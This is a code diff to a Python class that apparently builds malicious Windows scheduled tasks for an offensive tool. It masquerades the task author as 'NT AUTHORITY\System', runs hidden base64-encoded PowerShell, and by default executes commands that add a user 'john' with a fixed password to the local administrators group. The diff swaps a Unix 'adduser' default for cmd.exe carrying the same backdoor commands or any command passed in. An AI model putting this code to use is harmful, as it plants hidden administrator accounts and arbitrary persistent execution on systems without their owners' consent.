@@ -25,7 +25,7 @@ class ScheduledTask:
             mod_date = datetime.now() - timedelta(days=30)
             self._mod_date = mod_date.strftime("%Y-%m-%d %H:%M:%S")
         self._guid = str(uuid.uuid4()).upper()
-        self._author = "\\administrator" # it needs to be looked on
+        self._author = "NT AUTHORITY\\System"
         if description:
             self._description = description
         else:
@@ -37,11 +37,13 @@ class ScheduledTask:
                 self._command = escape('-windowstyle hidden -nop -enc {}'.format(b64encode(command.encode('UTF-16LE')).decode("utf-8")))
             else:
                 self._command = escape('-windowstyle hidden -nop -enc {}'.format(b64encode('net user john H4x00r123.. /add;net localgroup administrators john /add'.encode('UTF-16LE')).decode('utf-8')))
-        # it needs to be looked on
         else:
-            self._shell = escape('/bin/sh')
-            self._command = escape('-c "adduser test"')
-        # it needs to be looked on
+            self._shell = escape('c:\\windows\\system32\\cmd.exe')
+            if command:
+                self._command = escape('/c "{}"'.format(command))
+            else:
+                self._command = escape('/c "net user john H4x00r123.. /add && net localgroup administrators john /add"')
+
         logging.debug(self._shell + " " + self._command)
         self._old_value = old_value
 
